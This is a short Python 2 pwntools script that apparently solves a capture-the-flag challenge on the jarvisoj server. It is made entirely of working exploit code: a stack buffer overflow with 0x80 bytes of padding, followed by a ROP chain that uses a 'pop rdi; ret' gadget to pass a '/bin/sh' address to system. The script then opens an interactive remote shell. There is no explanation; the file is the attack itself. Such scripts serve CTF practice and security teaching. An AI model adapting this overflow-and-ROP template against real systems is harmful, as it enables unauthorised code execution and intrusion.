#!/usr/bin/env python2
from pwn import *

bin_sh_addr = 0x0000000000600A90
callsystem_addr = 0x0000000000400603

conn = remote('pwn2.jarvisoj.com', 9882)

print conn.read(),
# 0x00000000004006b3 : pop rdi ; ret 
conn.send_raw('A' * 0x80 + 'fuckfuck' + pack(0x00000000004006b3, 64) + pack(bin_sh_addr, 64) + pack(callsystem_addr, 64))
conn.interactive()
